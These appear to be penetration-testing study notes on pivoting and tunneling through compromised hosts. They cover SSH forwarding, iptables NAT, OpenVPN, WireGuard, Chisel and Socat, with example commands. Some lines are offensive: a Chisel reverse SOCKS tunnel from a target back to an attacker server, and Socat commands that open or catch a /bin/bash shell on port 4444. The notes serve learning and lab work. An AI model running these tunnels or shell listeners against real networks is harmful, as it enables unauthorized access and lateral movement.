# Pivoting / Tunneling

Pivoting
- Using a compromised host as a jump point to reach other systems on the network

Tunneling
- Encapsulating traffic inside another protocol to bypass restrictions or hide communications
- "SSH tunneling"

Used after initial access to move deeper into a network that isn't directly reachable from the attacker

| What it is | What it do |
|------|--------------|
| Pivot host | The compromised machine used as the next launch platform to target machines that would be unaccessisible from the original launch point |
| Tunnel | A, usually encrypted, communication channel through a protocol/host |
| Port forwarding | Redirecting traffic from one port/host to another |
| SOCKS proxy | Intermediary server that forwards traffic between our device and the final destination (essentially trying to hide the source) |

Refs:
- https://www.cyberly.org/en/what-is-a-pivot-in-penetration-testing/index.html
- https://www.expressvpn.com/blog/what-is-socks5-how-do-socks-proxies-work/

---

## SSH

- Used for secure remote access
- Can also forward ports, create SOCKS proxies
- Can also also be used to syphon/tunnel traffic to a C2 node, encryptedly

| What it do | Command | What it do (enhanced) |
|-----------|---------|-------------|
| Local port forward | `ssh -L 8080:target:80 user@pivot` | Forwards our local port 8080 through pivot to internal target:80 (attacker localhost:8080 is target:80) |
| Remote port forward | `ssh -R 9090:localhost:22 user@attacker` | Opens port on attacker that tunnels back to compromised host (target localhost:9090 is attacker:22) |
| Dynamic (SOCKS) | `ssh -D 1080 user@pivot` | Creates SOCKS5 proxy on port 1080, routing all traffic through a pivot |
| Jump host | `ssh -J pivot user@target` | SSH directly to a target through a pivot in one command |

```bash
# Local port forward (ex, access an internal web page through pivot, inaccessible externally)
ssh -L 8080:192.168.2.10:80 user@10.0.0.5

# Dynamic SOCKS proxy (use with proxychains)
ssh -D 1080 user@10.0.0.5
proxychains nmap -sT 192.168.2.0/24

# Jump host
ssh -J user@10.0.0.5 user@192.168.2.10
```

More in-depth-ish writeups:
- [SSH Writeup](../03-hands-on/06-linux-remote-access/ssh.md)
- [Proxychains/SOCKS](../03-hands-on/10-metasploit/metasploit.md)

---

## iptables

- Linux kernel firewall / packet filtering tool
- Used for pivoting by setting up NAT rules to forward traffic through a compromised target
- Can also be used defensively to restrict/allow traffic
- Can also also be used to masquerade traffic, essentially changing where the traffic appears to originate from

| Flag / Option | What it does |
|--------------|-------------|
| `-A` | Append rule to chain |
| `-I` | Insert rule at top of chain |
| `-D` | Delete a rule |
| `-L` | List rules |
| `-F` | Flush (clear) all rules |
| `-t nat` | Target the NAT table |
| `PREROUTING` | Intercept traffic before routing |
| `POSTROUTING` | Modify traffic after routing decision |
| `FORWARD` | Rules for forwarded traffic |
| `MASQUERADE` | Source NAT, hides internal IPs behind pivot |

```bash
# Enable IP forwarding on pivot host
echo 1 > /proc/sys/net/ipv4/ip_forward

# Forward traffic arriving on port 8080 to internal target
iptables -t nat -A PREROUTING -p tcp --dport 8080 -j DNAT --to-destination 192.168.2.10:80

# Masquerade outbound traffic
iptables -t nat -A POSTROUTING -j MASQUERADE

# Allow forwarded traffic
iptables -A FORWARD -j ACCEPT
```

More in-depth-ish writeup:
- [IPTABLES Writeup](../03-hands-on/05-linux-networking/iptables.md)

---

## OpenVPN

- Open source VPN used to create encrypted tunnel between client and server

| What it is | What it do |
|-----------|-------------|
| Server config | `.ovpn` server file - defines network, certs, cipher |
| Client config | `.ovpn` client file - distributed to connect back |
| `tun` interface | Virtual network interface created by OpenVPN |
| Certificates | PKI auth with CA cert, server cert, client cert |
| `--dev tun` | Layer 3 tunnel (routed) |
| `--dev tap` | Layer 2 tunnel (bridged) |

```bash
# Start OpenVPN server
openvpn --config server.ovpn

# Connect as client
openvpn --config client.ovpn

# Common ports
UDP 1194    # default OpenVPN port
TCP 443     # often used to look like HTTPS traffic
```

More in-depth-ish writeup (with lab configs):
- [OPENVPN Writeup](../01-fundamentals/02-vpn/openvpn.md)

---

## WireGuard

- Lower-overhead/lighter-weight VPN (simpler than openvpn in my opinion)
- Uses public/private key pairs, no certificates or PKI needed

| Component | What it does |
|-----------|-------------|
| `wg` | CLI tool to manage WireGuard interfaces |
| `wg-quick` | Simple config based setup |
| `[Interface]` | Local peer config - private key, IP, port |
| `[Peer]` | Remote peer config - public key, endpoint, allowed IPs |
| `AllowedIPs` | What network traffic routes through the tunnel |

```bash
# Generate key pair
wg genkey > /etc/wireguard/privatekey
wg pubkey < /etc/wireguard/privatekey > /etc/wireguard/publickey

# Example config /etc/wireguard/wg0.conf
[Interface]
Address = 172.16.10.1/30
ListenPort = 51820
PrivateKey = <ubuntu_private_key>

[Peer]
PublicKey = <kali_public_key>
AllowedIPs = 172.16.10.2/32, 1.1.1.0/24

# Bring interface up
wg-quick up wg0
```

More in-depth-ish writeup (with configs):
- [WIREGUARD Writeup](../01-fundamentals/02-vpn/wireguard.md)

---

## Chisel

- TCP/UDP tunneling tool over HTTP/S (written in Go)
- Designed for pivoting through firewalls/restrictive networks
- Client/server model similar to other VPN concepts
- Useful when SSH isnt available or outbound traffic is filtered
- Portforwarding/reverese tunneling

| Mode | What it does |
|------|-------------|
| Server | Runs on attacker machine |
| Client | Runs on pivot host |
| `R:` prefix | Reverse tunnel - pivot connects out, attacker gets access in |
| SOCKS5 | SOCKS proxy support for routing all traffic |

```bash
# On attacker machine (server)
chisel server --port 8080 --reverse

# On target machine (client) reverse SOCKS proxy
chisel client 10.0.0.1:8080 R:socks

# On attack machine, route traffic through SOCKS proxy
proxychains nmap -sT 192.168.2.0/24

# Forward specific port
chisel client 10.0.0.1:8080 R:6969:192.168.2.10:445
```
Ref:
- https://medium.com/@laurent.mandine/chisel-the-hackers-hidden-tunnel-for-stealthy-network-access-acdcdaafeabd
- https://1337skills.com/cheatsheets/chisel/

---

## Socat

Similar-ish to Chisel, i used it to forward a local `JetDirect` port (9100) bound to the loopback of some HTB machine i was working on, so that i could access the port from my attack machine
- it was preinstalled on the box

**Multipurpose relay for bidirectional data transfer**
"Socat (for SOcket CAT) establishes two bidirectional byte streams and transfers data between them. Data channels may be files, pipes, devices (terminal or modem, etc.), or sockets (Unix, IPv4, IPv6, raw, UDP, TCP, SSL). It provides forking, logging and tracing, different modes for interprocess communication and many more options.

It can be used, for example, as a TCP relay (one-shot or daemon), as an external socksifier, as a shell interface to Unix sockets, as an IPv6 relay, as a netcat and rinetd replacement, to redirect TCP-oriented programs to a serial line, or to establish a relatively secure environment (su and chroot) for running client or server shell scripts inside network connections. Socat supports sctp as of 1.7.0."

| Mode | What it does |
|---|---|
| `TCP-LISTEN` | Opens a listening TCP socket |
| `fork` | Spawns a new subprocess per connection (can handles multiple clients) |
| `reuseaddr` | Immediate rebinding to the port |
| `-` (stdio) | Uses stdin/stdout as one endpoint (interactive raw protocol testing) |

```bash
# Forward a loopback service (like 127.0.0.1:9100) to be reachable externally
socat TCP-LISTEN:9101,fork,reuseaddr TCP:127.0.0.1:9100 &

# Full reverse shell listener (alternative to nc)
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane

# Catch a reverse shell with a proper TTY from a target using socat
socat file:`tty`,raw,echo=0 TCP-LISTEN:4444

# Talk directly to a raw TCP service (like nc, but always available)
socat - TCP:10.10.10.10:9100

# Relay a UNIX domain socket to TCP (like exposing a local management socket for remote access)
socat TCP-LISTEN:8081,fork,reuseaddr UNIX-CONNECT:/run/some/service.sock
```

Refs:
- https://www.kali.org/tools/socat/
- https://www.man7.org/linux/man-pages/man1/socat.1.html

---

## References
- [SSH Man Page](https://man.openbsd.org/ssh)
- [iptables Man Page](https://linux.die.net/man/8/iptables)
- [OpenVPN Docs](https://openvpn.net/community-resources/)
- [WireGuard Docs](https://www.wireguard.com/)
- [Chisel GitHub](https://github.com/jpillora/chisel)
- [Socat - kali](https://www.kali.org/tools/socat/)
